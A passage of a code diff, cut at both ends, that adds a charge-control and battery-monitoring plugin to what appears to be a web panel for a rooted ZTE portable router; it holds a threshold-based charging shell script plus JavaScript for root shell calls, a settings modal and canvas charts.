+    fi
+
+    if [ "$LAST_PHYSICAL_CHARGING" = "0" ] && [ "$CURRENT_PHYSICAL_CHARGING" = "1" ]; then
+        log "检测到插入充电器，电量 $CAPACITY%"
+        if [ "$CAPACITY" -gt "$START_CHARGE" ] && [ "$CAPACITY" -lt "$MAX_CHARGE" ]; then
+            TARGET_SWITCH_STATE=1
+        fi
+    fi
+
+    if [ "$TARGET_SWITCH_STATE" != "$CURRENT_SWITCH_STATE" ] && [ "$TARGET_SWITCH_STATE" != "-1" ]; then
+        if [ "$TARGET_SWITCH_STATE" = "0" ]; then
+            if [ "$CAPACITY" -ge "$MAX_CHARGE" ]; then
+                REASON="电量 $CAPACITY% >= 最大 $MAX_CHARGE%，强制关闭充电"
+            else
+                REASON="其他原因触发关闭充电"
+            fi
+            log "准备关闭充电：$REASON"
+        else
+            if [ "$CAPACITY" -ge "$START_CHARGE" ] && [ "$CAPACITY" -lt "$MAX_CHARGE" ]; then
+                REASON="电量 $CAPACITY% 在区间 $START_CHARGE%~$MAX_CHARGE%，强制开启充电"
+            else
+                REASON="其他原因触发开启充电"
+            fi
+            log "准备开启充电：$REASON"
+        fi
+        apply_switch_state "$TARGET_SWITCH_STATE"
+    fi
+
+    LAST_PHYSICAL_CHARGING=$CURRENT_PHYSICAL_CHARGING
+}
+
+LAST_PHYSICAL_CHARGING=$(get_physical_charging_status)
+log "充电控制脚本启动..."
+
+inotify_callback() {
+    log "检测到充电状态文件变化"
+    handle_charging_logic
+}
+
+TMP_DIR="/data/local/tmp"
+FIFO="$TMP_DIR/inotify_pipe"
+rm -f "$FIFO"
+mkfifo "$FIFO"
+
+if is_magisk_env; then
+    log "检测到 Magisk 环境,正常启动"
+    inotifyd /system/bin/sh -c "echo event >> $FIFO" "$BATTERY_STATUS_PATH:m" &
+else
+    log "非 Magisk 环境,正常启动"
+    inotifyd "$FIFO":"$BATTERY_STATUS_PATH" &
+fi
+
+# 第3行固定提示，永远保留
+log "日志文件仅保留最近10行"
+
+(
+    while read -r event; do
+        inotify_callback
+    done < "$FIFO"
+) &
+
+while true; do
+    handle_charging_logic
+    sleep "$CHECK_INTERVAL"
+done`
+
+    // 原版弹窗 HTML
+    const charge_html = `
+<div class="title" style="justify-content:space-between">
+    <span>充电控制器</span>
+    <button onclick="showHelp()" style="border-radius: 50%">?</button>
+    </div>
+<div class="content" style="max-height: 90%;font-size:14px;overflow-y: scroll; padding-top: 10px;">
+    <span>自动模式</span>
+    <div style="margin-top: 8px;display: inline-block;" id="collapse_charge_plugin_btn"></div>
+    <button style="margin-left: 6px;" onclick="disable_charge()">直供电开</button>
+    <button onclick="enable_charge()">直供电关</button>
+    <div id="collapse_charge_plugin" class="collapse" data-name="close" style="height: 0px; overflow: auto;">
+        <div class="collapse_box" style="overflow:hidden">
+            <div style="margin: 10px 0;display:flex;justify-content:space-between;align-items:center">
+                <span style="min-width: 6em;">停止充电(%):</span><input id="stop_charge_val" style="flex:1;width:100%" type="range" id="charge-threshold" min="1" max="100" value="20"><span id="stop_charge_label" style="min-width: 4em">20 %</span>
+            </div>
+           
+            <div style="display:flex;gap:10px;margin-bottom:10px">
+                <button onclick="submit_charge_settings()" style="flex:1" data-i18n="submit_btn">提交</button>
+            </div>
+            
+            <div style="box-sizing:border-box">
+                <div class="title" style="font-size:14px;margin-bottom:10px">日志</div>
+            
+    <textarea id="charger_log" disabled style="margin-bottom:10px;border:none;box-sizing:border-box;width:100%;min-height:100px"></textarea>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="btn" style="text-align: right;margin-top:6px;">
+    <button type="button" onclick="close_charge_settings()" data-i18n="close_btn">关闭</button>
+</div>
+`
+
+    // --- 充电控制器逻辑 ---
+    // 安全获取 runShellWithRoot
+
+    const runShellSafe = typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : async () => ({ content: '' });
+    const checkRoot = async () => {
+        try {
+            const res = await runShellSafe('whoami');
+            return res.success && res.content.includes('root');
+        } catch { return false; }
+    };
+    const uploadFile = async (filename, content, destPath) => {
+        try {
+            const file = new File([content], filename, { type: "text/plain" });
+            const formData = new FormData();
+            formData.append("file", file);
+            // 【网络优化】添加10秒超时控制，防止fetch挂起导致内存泄漏
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 10000);
+            const uploadRes = await (await fetch(`${KANO_baseURL}/upload_img`, {
+                method: "POST", headers: common_headers, body: formData, signal: controller.signal,
+            })).json();
+            clearTimeout(timeoutId);
+            if (uploadRes.url) {
+                const tempPath = `/data/data/com.minikano.f50_sms/files${uploadRes.url}`;
+                const moveRes = await runShellSafe(`mv ${tempPath} ${destPath}`);
+                return moveRes.success;
+            } else { return false;
+            }
+        } catch (e) { return false; }
+    };
+    // 写入逻辑
+    const toggleCharge = async (enableCharge) => {
+        try {
+            const flag = enableCharge ? "1" : "0";
+            const res = await runShellSafe(`
+                echo ${flag} > /sys/class/power_supply/interface/battery_charging_enabled
+                echo ${flag} > /sys/class/zte_power_supply/zte_battery/battery_charging_enabled
+                echo ${flag} > /sys/class/power_supply/battery/battery_charging_enabled
+            `);
+            return res.success;
+        } catch (e) { return false; }
+    };
+    const getConfig = async () => {
+        if (!(await checkRoot())) return false;
+        const res = await runShellSafe(`timeout 2s  awk \'{print}\' ${CONFIG_FILE}`);
+        const res1 = await runShellSafe(`timeout 2s  awk \'{print}\' ${BOOT_SH_FILE}`);
+        if (res.success) {
+            const configText = res.content
+            const maxMatch = configText.match(/max_charge=(\d+)/);
+            const startMatch = configText.match(/start_charge=(\d+)/);
+            if (maxMatch) CONFIG.max_charge = parseInt(maxMatch[1], 10);
+            if (startMatch) CONFIG.start_charge = parseInt(startMatch[1], 10);
+      // 强制保护：开始充电值绝对不能大于等于停止充电值
+            if (CONFIG.start_charge >= CONFIG.max_charge) {
+                CONFIG.start_charge = Math.max(1, CONFIG.max_charge - 10);
+            }
+        }
+        if (res1) {
+            let enabled = res1.content.includes(NAME)
+            CONFIG.enabled = enabled
+            localStorage.setItem('collapse_charge_plugin', enabled ? 'open' : 'close')
+        }
+    }
+
+    let oldLog = null
+    const getLog = async () => {
+        if (!(await checkRoot())) return false;
+        const charger_log = document.querySelector('#charger_log')
+        if (charger_log) {
+            let res = await runShellSafe(`timeout 2s  awk \'{print}\' ${LOG_FILE}`);
+            if ((res.content != oldLog) || (oldLog == null)) {
+                setTimeout(() => {
+                    charger_log.scrollTo({ top: charger_log.scrollHeight, behavior: "smooth" })
+                }, 100);
+            }
+            oldLog = res.content
+            charger_log.value = res.content
+        }
+    }
+
+    const killProcessByName = async (processName) => {
+        const psResult = await runShellSafe(`ps -ef | grep "${processName}" | grep -v grep`);
+        const lines = psResult.content.trim().split('\n');
+        
+        if (lines.length > 0 && lines[0].trim() !== '') {
+            for (const line of lines) {
+                const parts = line.trim().split(/\s+/);
+                const pid = parts[1]; // 提取 PID
+                if (pid && /^\d+$/.test(pid)) {
+                    await runShellSafe(`kill -9 ${pid}`);
+                }
+            }
+        }
+        
+        const inotifyResult = await runShellSafe(`ps -ef | grep "inotify_pipe" | grep -v grep`);
+        const inotifyLines = inotifyResult.content.trim().split('\n');
+        if (inotifyLines.length > 0 && inotifyLines[0].trim() !== '') {
+            for (const line of inotifyLines) {
+                const parts = line.trim().split(/\s+/);
+                const pid = parts[1];
+                if (pid && /^\d+$/.test(pid)) {
+                    await runShellSafe(`kill -9 ${pid}`);
+                }
+            }
+        }
+        
+        return { success: true };
+    };
+
+    const setRange = async () => {
+        if (!(await checkRoot())) return createToast("未root", "red");
+        await runShellSafe(`timeout 2s  echo "max_charge=${CONFIG.max_charge}\nstart_charge=${CONFIG.start_charge}" > ${CONFIG_FILE}`);
+        await killProcessByName(NAME)
+        await runShellSafe(`/system/bin/sh ${SH_FILE} &`)
+        createToast("设置成功，等待日志刷新...")
+    }
+
+    const uninstall = async () => {
+        if (!(await checkRoot())) return createToast("未root", "red");
+        await runShellSafe(`sed -i '/kano_charge_control/d' /sdcard/ufi_tools_boot.sh`)
+        await runShellSafe(`rm -rf ${CONFIG_FILE} ${SH_FILE} ${LOG_FILE}`)
+        await killProcessByName(NAME)
+        createToast("恢复充电模式...")
+        await toggleCharge(true)
+        createToast("脚本已停用")
+    }
+
+    const install = async () => {
+        if (!(await checkRoot())) return createToast("未root", "red");
+        if (!await uploadFile("kano_charge_control.sh", SCRIPT_CONTENT, SH_FILE)) return createToast("文件失败", "red");
+        await runShellSafe(`grep -qxF '/system/bin/sh ${SH_FILE} &' /sdcard/ufi_tools_boot.sh || echo '/system/bin/sh ${SH_FILE} &' >> /sdcard/ufi_tools_boot.sh`)
+        await runShellSafe(`/system/bin/sh ${SH_FILE} &`)
+        return createToast("已启用并设为自启动")
+    }
+
+    // ==============================================
+    // 界面操作逻辑
+    // ==============================================
+    window.submit_charge_settings = async () => {
+        const stop_charge_val = document.querySelector('#stop_charge_val');
+        if (stop_charge_val) CONFIG.max_charge = stop_charge_val.value;
+        
+        if (Number(CONFIG.max_charge) <= Number(CONFIG.start_charge)) return createToast("触发充电值必须大于1%", 'red');
+    await setRange()
+    
+        if (typeof pluginState !== 'undefined') {
+            pluginState.lastStatus = "FORCE_UPDATE";
+            pluginState.statusStartTime = Date.now(); // 开启“3秒空余+5秒检测”
+            pluginState.smoothedCurrent = null;
+            pluginState.cachedTimeLabel = Number(CONFIG.max_charge) < 100 ? `距${CONFIG.max_charge}%预计` : "充满预计";
+            pluginState.cachedTimeVal = "计算中";
+            
+            const L = document.getElementById('battery_time_label');
+            const V = document.getElementById('battery_time_val');
+            if (L) L.textContent = pluginState.cachedTimeLabel;
+            if (V) V.textContent = pluginState.cachedTimeVal;
+        }
+        
+        await setRange();
+        setTimeout(() => { if(typeof fetchBatteryInfo === 'function') fetchBatteryInfo(); }, 200);
+    }
+
+// 启用充电（直供电关）
+    window.enable_charge = async () => {
+        if(CONFIG.enabled) return createToast("请先关闭自动模式", "red");
+        
+        // UI秒切
+        if (typeof pluginState !== 'undefined') {
+            pluginState.lastStatus = "FORCE_UPDATE";
+            pluginState.statusStartTime = Date.now();
+            pluginState.smoothedCurrent = null;
+            pluginState.cachedTimeLabel = "预估";
+            pluginState.cachedTimeVal = "计算中";
+            const L = document.getElementById('battery_time_label');
+            const V = document.getElementById('battery_time_val');
+            if(L) L.textContent = pluginState.cachedTimeLabel;
+            if(V) V.textContent = pluginState.cachedTimeVal;
+        }
+        
+        await toggleCharge(true); 
+        createToast("设置成功");
+        setTimeout(() => { if(typeof fetchBatteryInfo === 'function') fetchBatteryInfo(); }, 200);
+    }
+    
+    // 禁用充电（直供电开）
+    window.disable_charge = async () => {
+        if(CONFIG.enabled) return createToast("请先关闭自动模式", "red");
+        
+        if (typeof pluginState !== 'undefined') {
+            pluginState.lastStatus = "FORCE_UPDATE";
+            pluginState.statusStartTime = Date.now();
+            pluginState.smoothedCurrent = null;
+            pluginState.cachedTimeLabel = "当前";
+            pluginState.cachedTimeVal = "直供电中";
+            const L = document.getElementById('battery_time_label');
+            const V = document.getElementById('battery_time_val');
+            if(L) L.textContent = pluginState.cachedTimeLabel;
+            if(V) V.textContent = pluginState.cachedTimeVal;
+        }
+        
+        await toggleCharge(false); 
+        createToast("设置成功");
+        setTimeout(() => { if(typeof fetchBatteryInfo === 'function') fetchBatteryInfo(); }, 200);
+    }
+
+    const initWindow = async () => {
+        const stop_charge_val = document.querySelector('#stop_charge_val')
+        if (stop_charge_val) {
+            const stop_charge_label = document.querySelector('#stop_charge_label')
+            stop_charge_label.innerHTML = CONFIG.max_charge + " %"
+            stop_charge_val.value = CONFIG.max_charge
+            stop_charge_val.oninput = (e) => {
+                const target = e.target
+                stop_charge_label.innerHTML = target.value + " %"
+                CONFIG.max_charge = target.value
+            }
+        }
+    }
+
+    const el = document.createElement('div')
+    el.id = "charge_plugin"
+    el.classList.add('modal')
+    el.style.opacity = "1"
+    el.style.maxWidth = "400px"
+    el.style.width = '90%'
+    el.style.display = "none"
+    el.innerHTML = charge_html
+    const modalContainer = document.querySelector('.container') || document.body;
+    modalContainer.appendChild(el);
+
+    await getConfig()
+    initWindow()
+
+    collapseGen('#collapse_charge_plugin_btn', '#collapse_charge_plugin', 'collapse_charge_plugin', async (status) => {
+        if (status == "open") {
+            createToast("开启中..")
+            await setRange()
+            await install()
+            CONFIG.enabled = true
+        } else {
+            createToast("关闭中..")
+            await uninstall()
+            CONFIG.enabled = false
+        }
+    })
+
+    
+
+    let timer = null
+    const openChargeSettings = async () => {
+        showModal("#charge_plugin")
+        timer && timer()
+        getLog()
+        timer = requestInterval(getLog, 2000)
+        await getConfig()
+        initWindow()
+    }
+
+    window.close_charge_settings = () => {
+        timer && timer()
+        closeModal('#charge_plugin')
+    }
+
+    window.showHelp = () => {
+        const message = `安装并配置充电百分比后，插件会自动管理充电
+              当电量在低于设定值时自动开启充电，达到设定值上限会自动关闭充电
+            插入充电器时，若电量在设定值以下时也会自动开启充电。
+            所有操作均有日志记录，无需用户手动干预，保证电池健康和充电安全。
+            您也可以将“禁用充电”视为直供电模式，此时充电电流为0
+            `.replaceAll('\n', "<br>")
+        const { el, close } = createFixedToast('kano_help_message', `
+                    <div style="pointer-events:all;width:80vw;max-width:300px">
+                        <div class="title" style="margin:0" data-i18n="system_notice">使用说明</div>
+                        <div style="margin:10px 0">${message}</div>
+                        <div style="text-align:right">
+                             <button style="font-size:.64rem" id="close_message_btn" data-i18n="pay_btn_dismiss">${t('pay_btn_dismiss')}</button>
+                        </div>
+                    </div>
+                    `)
+        const btn = el.querySelector('#close_message_btn')
+        if (!btn) { close(); return }
+        btn.onclick = async () => { close() }
+    }
+
+
+    // ==========================================
+    // 模块二：电池监控 V2.0 (UI 逻辑)
+    // ==========================================
+    
+    const PLUGIN_CONFIG = {
+        BATTERY_PATHS: {
+            CAPACITY: "/sys/class/power_supply/battery/capacity",
+            STATUS: "/sys/class/power_supply/battery/status",
+            HEALTH: "/sys/class/power_supply/battery/health",
+            TEMP: "/sys/class/power_supply/battery/temp",
+            VOLTAGE: "/sys/class/power_supply/battery/voltage_now",
+            CURRENT: "/sys/class/power_supply/battery/current_now",
+            CHARGE_FULL: "/sys/class/power_supply/battery/charge_full",
+            CHARGE_FULL_DESIGN: "/sys/class/power_supply/battery/charge_full_design"
+        },
+        STATUS_MAP: {
+            "Charging": {text: "充电中", color: "#50fa7b"},
+            "Discharging": {text: "放电中", color: "#ffb86c"},
+             "Full": {text: "已充满", color: "#8be9fd"},
+            "Not charging": {text: "未充电", color: "#6272a4"},
+            "Unknown": {text: "未知", color: "#bd93f9"}
+        },
+        HEALTH_MAP: {
+            "Good": "良好", "Overheat": "过热", "Dead": "损坏",
+            "Over voltage": "过压", "Cold": "过冷", "Unknown": "未知"
+        },
+        VOLTAGE_CURRENT_UPDATE_INTERVAL: 1000,
+        FULL_UPDATE_INTERVAL: 3000,
+        RING_CIRCUMFERENCE: 439.6
+    };
+    const ICONS = {
+        BOLT: `<svg viewBox="0 0 24 24" fill="currentColor" width="100%" height="100%"><path d="M13 2L3 14H12L11 22L21 10H12L13 2Z"></path></svg>`,
+        BATTERY: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="100%" height="100%"><rect x="2" y="7" width="16" height="10" rx="2" ry="2"></rect><line x1="22" y1="11" x2="22" y2="13"></line></svg>`
+    };
+    const pluginState = {
+        monitoring: false,
+        updateTimer: null,
+        voltageCurrentTimer: null,
+        initTime: Date.now(),         // 记录网页刚打开的时间
+        smoothedCurrent: null,     // 存储平滑处理后的电流
+        lastStatus: "",       
+        lastTimeCalc: 0,      
+        cachedTimeLabel: "预估", 
+        cachedTimeVal: "计算中", 
+        cachedTimeColor: "#bd93f9",
+        batteryData: {
+            level: 0, status: "Unknown", health: "Unknown", temperature: 0,
+            voltage: 0, current: 0, chargeFull: 0, chargeFullDesign: 0,
+            chargingEnabled: "1" 
+        },
+       history: { time: [], temp: [], level: [], power: [] }
+    };
+
+    const getElement = (id) => document.getElementById(id);
+    // 基于绝对时间戳的提取器
+    const getChartData = (dataArr, timeArr, hours, maxPoints) => {
+        if (!dataArr || !timeArr || dataArr.length === 0) return { data: [], time: [] };
+        const cutoff = Date.now() - hours * 3600 * 1000;
+        const bucketSize = (hours * 3600 * 1000) / maxPoints; 
+        
+        const resData = [], resTime = [];
+        let lastBucket = -1;
+
+        for (let i = 0; i < timeArr.length; i++) {
+            if (timeArr[i] >= cutoff) {
+                const currentBucket = Math.floor(timeArr[i] / bucketSize);
+                
+                if (currentBucket !== lastBucket || i === timeArr.length - 1) {
+                    resData.push(dataArr[i]);
+                    resTime.push(timeArr[i]);
+                    lastBucket = currentBucket;
+                }
+            }
+        }
+        
+        if (resData.length === 0) return { data: dataArr.slice(-1), time: timeArr.slice(-1) };
+        return { data: resData, time: resTime };
+    };
+
+    // 基础画图函数
+    const drawChart = (canvasId, dataArray, currentColorHex, isFill, showLabels = false, animProgress = 1, timeArray = null) => {
+        const canvas = getElement(canvasId);
+        if (!canvas || !dataArray || dataArray.length < 2) return;
+        
+        const rect = canvas.getBoundingClientRect();
+        if (rect.width === 0 || rect.height === 0) return;
+
+        const ctx = canvas.getContext('2d');
+        const dpr = window.devicePixelRatio || 1;
+        canvas.width = rect.width * dpr;
+        canvas.height = rect.height * dpr;
+        ctx.scale(dpr, dpr);
+
+        const w = rect.width, h = rect.height;
+        ctx.clearRect(0, 0, w, h);
+
+        if (animProgress < 1) {
+            ctx.save();
+            ctx.beginPath();
+            ctx.rect(0, 0, w * animProgress, h);
+            ctx.clip();
+        }
+
+        let max = Math.max(...dataArray), min = Math.min(...dataArray);
+        if (max === min) { max += 1; min -= 1; }
+
+        if (canvasId === 'power_chart_canvas') {
+            let actualMax = Math.max(max, 0.5);
+            let actualMin = Math.min(min, -0.5);
+            const largest = Math.max(actualMax, Math.abs(actualMin) * 2);
+            max = largest;
+            min = -largest / 2;
+        }
+
+        const padTop = h * 0.2, padBottom = h * 0.2, usableH = h - padTop - padBottom, range = max - min, stepX = w / (dataArray.length - 1);
+        const getY = (val) => h - padBottom - ((val - min) / range) * usableH;
+        const getOff = (val) => Math.max(0, Math.min(1, getY(val) / h));
+
+        ctx.beginPath();
+        const isSmooth = (canvasId === 'temp_chart_canvas' || canvasId === 'power_chart_canvas');
+        if (isSmooth && dataArray.length > 2) {
+            const pts = dataArray.map((val, i) => ({ x: i * stepX, y: getY(val) }));
+            ctx.moveTo(pts[0].x, pts[0].y);
+            for (let i = 1; i < pts.length - 2; i++) {
+                const xc = (pts[i].x + pts[i + 1].x) / 2;
+                const yc = (pts[i].y + pts[i + 1].y) / 2;
+                ctx.quadraticCurveTo(pts[i].x, pts[i].y, xc, yc);
+            }
+            ctx.quadraticCurveTo(pts[pts.length - 2].x, pts[pts.length - 2].y, pts[pts.length - 1].x, pts[pts.length - 1].y);
+        } else {
+            dataArray.forEach((val, i) => {
+                const x = i * stepX, y = getY(val);
+                if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
+            });
+        }
+        
+        let lineStyle = currentColorHex;
+        if (canvasId === 'temp_chart_canvas') {
+            lineStyle = ctx.createLinearGradient(0, 0, 0, h);
+            lineStyle.addColorStop(0, '#ff5555'); lineStyle.addColorStop(getOff(45), '#ff5555');
+            lineStyle.addColorStop(getOff(45), '#ffb86c'); lineStyle.addColorStop(getOff(35), '#ffb86c');
+            lineStyle.addColorStop(getOff(35), '#50fa7b'); lineStyle.addColorStop(1, '#50fa7b');
+        } 
+
+        ctx.strokeStyle = lineStyle; ctx.lineWidth = 2; ctx.lineJoin = 'round'; ctx.stroke();
+
+        if (isFill) {
+            ctx.lineTo(w, h); ctx.lineTo(0, h); ctx.closePath();
+            const gradFill = ctx.createLinearGradient(0, 0, 0, h);
+            const hexToRgba = (hex, a) => `rgba(${parseInt(hex.slice(1, 3), 16)}, ${parseInt(hex.slice(3, 5), 16)}, ${parseInt(hex.slice(5, 7), 16)}, ${a})`;
+            try {
+                if (canvasId === 'temp_chart_canvas') {
+                    gradFill.addColorStop(0, hexToRgba('#50fa7b', 0.35));
+                    gradFill.addColorStop(1, hexToRgba('#50fa7b', 0.05));
+                } else {
+                    gradFill.addColorStop(0, hexToRgba(currentColorHex, 0.5));
+                    gradFill.addColorStop(1, hexToRgba(currentColorHex, 0));
+                }
+                ctx.fillStyle = gradFill;
+                ctx.fill();
+            } catch(e) {}
+        }
+        
+        if (canvasId === 'power_chart_canvas') {
+            ctx.beginPath();
+            ctx.strokeStyle = 'rgba(255,255,255,0.2)'; 
+            ctx.setLineDash([2, 2]); 
+            const y0 = getY(0); 
+            ctx.moveTo(0, y0); ctx.lineTo(w, y0); ctx.stroke();
+            ctx.setLineDash([]);
+        }
+
+        if (showLabels) {
+            const isMobile = window.innerWidth <= 768;
+            const fontSize = isMobile ? 10 : 11;
+            ctx.font = `${fontSize}px 'JetBrains Mono', sans-serif`;
+            let midnightX = -1;
+            
+            const times = timeArray || pluginState.history.time;
+            if (canvasId === 'level_chart_canvas' && times && times.length > 1) {
+                ctx.beginPath();
+                ctx.strokeStyle = 'rgba(255,255,255,0.2)'; 
+                ctx.setLineDash([4, 4]); 
+                for (let i = 1; i < times.length; i++) {
+                    const dPrev = new Date(times[i - 1]);
+                    const dCurr = new Date(times[i]);
+                    if (dPrev.getDate() !== dCurr.getDate()) {
+                        const xPos = i * stepX;
+                        midnightX = xPos; 
+                        ctx.moveTo(xPos, 33);
+                        ctx.lineTo(xPos, h - 35);
+                    }
+                }
+                ctx.stroke();
+                ctx.setLineDash([]); 
+            }
+
+            if (canvasId === 'level_chart_canvas' && dataArray.length > 1) {
+                ctx.fillStyle = 'rgba(255,255,255,0.7)';
+                ctx.textBaseline = 'bottom';
+                ctx.shadowColor = 'transparent';
+                ctx.shadowBlur = 0;
+
+                const drawnX = [];
+                const drawTimeIfSpace = (text, align, renderX) => {
+                    for (let dx of drawnX) {
+                        if (Math.abs(renderX - dx) < 35) return;
+                    }
+                    ctx.textAlign = align;
+                    ctx.fillText(text, renderX, h - 16);
+                    drawnX.push(renderX);
+                };
+
+                if (times && times[dataArray.length - 1]) {
+                    const dEnd = new Date(times[dataArray.length - 1]);
+                    const hhEnd = String(dEnd.getHours()).padStart(2, '0');
+                    const mmEnd = String(dEnd.getMinutes()).padStart(2, '0');
+                    drawTimeIfSpace(`${hhEnd}:${mmEnd}`, 'right', w - 5);
+                }
+
+                if (midnightX !== -1 && midnightX > 35) {
+                    drawTimeIfSpace("00:00", 'center', midnightX);
+                }
+
+                const segments = dataArray.length < 5 ? 1 : 4;
+                for (let i = 1; i < segments; i++) {
+                    const xPos = i * (w / segments);
+                    const dataIdx = Math.floor(i * (dataArray.length - 1) / segments);
+                    if (times && times[dataIdx]) {
+                        const d = new Date(times[dataIdx]);
+                        const hh = String(d.getHours()).padStart(2, '0');
+                        const mm = String(d.getMinutes()).padStart(2, '0');
+                        drawTimeIfSpace(`${hh}:${mm}`, 'center', xPos);
+                    }
+                }
+            }
+
+            ctx.fillStyle ='#ffffff';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'top'; 
+            ctx.fillText(`最高: ${max.toFixed(0)}`, 5, 5); 
+            
+            ctx.textBaseline = 'bottom'; 
+            ctx.fillText(`最低: ${min.toFixed(0)}`, 5, h - 16);
+            const current = dataArray[dataArray.length - 1];
+            ctx.fillStyle = currentColorHex; 
+            ctx.textAlign = 'right'; 
+            ctx.textBaseline = 'middle';
+            let yCurrent = getY(current);
+            if (yCurrent < 15) yCurrent = 15; 
+            if (yCurrent > h - 15) yCurrent = h - 15;
+            ctx.fillText(`当前: ${current.toFixed(0)}`, w - 5, yCurrent - 10);
+        }
+        if (animProgress < 1) ctx.restore();
+    };
+
+    // 动效引擎（支持透传时间数组）
+    const animateChart = (canvasId, dataArray, currentColorHex, isFill, showLabels = false, timeArray = null) => {
+        let start = null;
+        const duration = 500; 
+        const step = (timestamp) => {
+            if (!start) start = timestamp;
+            const progress = Math.min((timestamp - start) / duration, 1);
+            const easeProgress = 1 - Math.pow(1 - progress, 3);
+            drawChart(canvasId, dataArray, currentColorHex, isFill, showLabels, easeProgress, timeArray);
+            if (progress < 1) requestAnimationFrame(step);
+        };
+        requestAnimationFrame(step);
+    };
+    const checkRootAccess = async () => {
+        try {
+            const res = await runShellWithRoot('whoami');
+            if (res && res.content && res.content.includes('root')) return true;
+        } catch {}
+        createToast("需要开启高级功能才能使用此插件", 'red');
+        return false;
+    };
+    
+    const getBatteryColor = (level) => {
+        if (level <= 10) return "#ff5555";
+        if (level <= 20) return "#ffb86c";
+        if (level <= 40) return "#f1fa8c";
+        if (level <= 80) return "#8be9fd";
+        return "#50fa7b";
+    };
+
+    const getTemperatureColor = (tempC) => {
+        if (tempC <= 35) return "#50fa7b";
+        if (tempC <= 45) return "#ffb86c";
+        return "#ff5555";
+    };
+
+    const safeCheck = () => {
+        if (!document.getElementById('BATTERY_PRO_CONTAINER')) {
+            clearInterval(pluginState.updateTimer);
+            clearInterval(pluginState.voltageCurrentTimer);
+            pluginState.monitoring = false;
+            return false;
+        }
+        return true;
+    };
+
+    const updateCpuTempDisplay = () => {
+        if (!safeCheck()) return;
+        
+        const cpuTempEl = getElement('header_cpu_temp');
+
+        if (cpuTempEl) {
+            if (window.UFI_DATA && typeof window.UFI_DATA.cpu_temp !== 'undefined') {
+                const cpuTemp = window.UFI_DATA.cpu_temp / 1000;
+                cpuTempEl.textContent = cpuTemp.toFixed(1); 
+                
+                let tempColor = "#50fa7b"; // 默认绿色（45度及以下）
+                if (cpuTemp > 55) {
+                    tempColor = "#ff5555"; // 55度以上：红色
+                } else if (cpuTemp > 45) {
+                    tempColor = "#ffb86c"; // 45度到55度之间：橙色
+                }
+                
+                cpuTempEl.style.color = tempColor; // 只有数字变色
+            } else {
+                cpuTempEl.textContent = "--.-";
+                cpuTempEl.style.color = "rgba(255,255,255,0.6)"; 
+            }
+        }
+    };
+// 一次性打包读取，增加柔性容错防卡死
+    const fetchBatteryInfo = async () => {
+        if (!safeCheck()) return;
+        const p = PLUGIN_CONFIG.BATTERY_PATHS;
+        const cmd = `awk '{print}' /sys/class/zte_power_supply/zte_battery/capacity 2>/dev/null || awk '{print}' ${p.CAPACITY} 2>/dev/null || echo "KEEP"; awk '{print}' /sys/class/zte_power_supply/zte_battery/status 2>/dev/null || awk '{print}' ${p.STATUS} 2>/dev/null || echo "KEEP"; awk '{print}' /sys/class/zte_power_supply/zte_battery/health 2>/dev/null || awk '{print}' ${p.HEALTH} 2>/dev/null || echo "KEEP"; awk '{print}' /sys/class/zte_power_supply/zte_battery/temp 2>/dev/null || awk '{print}' ${p.TEMP} 2>/dev/null || echo "KEEP"; awk '{print}' /sys/class/zte_power_supply/zte_battery/charge_full 2>/dev/null || awk '{print}' ${p.CHARGE_FULL} 2>/dev/null || echo "KEEP"; awk '{print}' /sys/class/zte_power_supply/zte_battery/charge_full_design 2>/dev/null || awk '{print}' ${p.CHARGE_FULL_DESIGN} 2>/dev/null || echo "KEEP"; if [ -f "/sys/class/zte_power_supply/zte_battery/battery_charging_enabled" ]; then awk '{print}' /sys/class/zte_power_supply/zte_battery/battery_charging_enabled || echo "KEEP"; elif [ -f "/sys/class/power_supply/interface/battery_charging_enabled" ]; then awk '{print}' /sys/class/power_supply/interface/battery_charging_enabled || echo "KEEP"; elif [ -f "/sys/class/power_supply/battery/battery_charging_enabled" ]; then awk '{print}' /sys/class/power_supply/battery/battery_charging_enabled || echo "KEEP"; else echo "KEEP"; fi`;
+        
+        try {
+            const res = await runShellWithRoot(cmd);
+            if (res && res.success) {
+                const lines = res.content.trim().split('\n');
+                const getSafeValue = (index, fallback) => {
+                    if (lines[index] !== undefined && lines[index] !== "KEEP" && lines[index] !== "") {
+                        return lines[index].trim();
+                    }
+                    return fallback;
+                };
+
+                const capacity = getSafeValue(0, pluginState.batteryData.level);
+                const status = getSafeValue(1, pluginState.batteryData.status);
+                const health = getSafeValue(2, pluginState.batteryData.health);
+                const temp = getSafeValue(3, pluginState.batteryData.temperature);
+                const chargeFull = getSafeValue(4, pluginState.batteryData.chargeFull);
+                const chargeFullDesign = getSafeValue(5, pluginState.batteryData.chargeFullDesign);
+                const chargingEnabled = getSafeValue(6, pluginState.batteryData.chargingEnabled);
+
+                pluginState.batteryData = {
+                    ...pluginState.batteryData,
+                    level: parseInt(capacity) || pluginState.batteryData.level,
+                    status: status in PLUGIN_CONFIG.STATUS_MAP ? status : "Unknown",
+                    health: health in PLUGIN_CONFIG.HEALTH_MAP ? health : "Unknown",
+                    temperature: parseInt(temp) || pluginState.batteryData.temperature,
+                    chargeFull: parseInt(chargeFull) || pluginState.batteryData.chargeFull,
+                    chargeFullDesign: parseInt(chargeFullDesign) || pluginState.batteryData.chargeFullDesign,
+                    chargingEnabled: chargingEnabled
+                };
+                
+                updateBatteryDisplay(); 
+            }
+        } catch (e) {
+            console.error("Batch read failed", e);
+        }
+    };
+const fetchVoltageCurrentInfo = async () => {
+    if (!safeCheck()) return;
+    const p = PLUGIN_CONFIG.BATTERY_PATHS;
+    
+   const cmd = `awk '{print}' /sys/class/zte_power_supply/zte_battery/voltage_now 2>/dev/null || awk '{print}' ${p.VOLTAGE} 2>/dev/null || echo "0"; awk '{print}' /sys/class/zte_power_supply/zte_battery/current_now 2>/dev/null || awk '{print}' ${p.CURRENT} 2>/dev/null || echo "0"`;
+    
+    try {
+        const res = await runShellWithRoot(cmd);
+        if (res && res.success) {
+             const lines = res.content.trim().split('\n');
+             if(lines.length < 2) return;
+             
+             const [voltage, current] = lines.map(l => l.trim());
+             
+             pluginState.batteryData.voltage = parseInt(voltage) || 0;
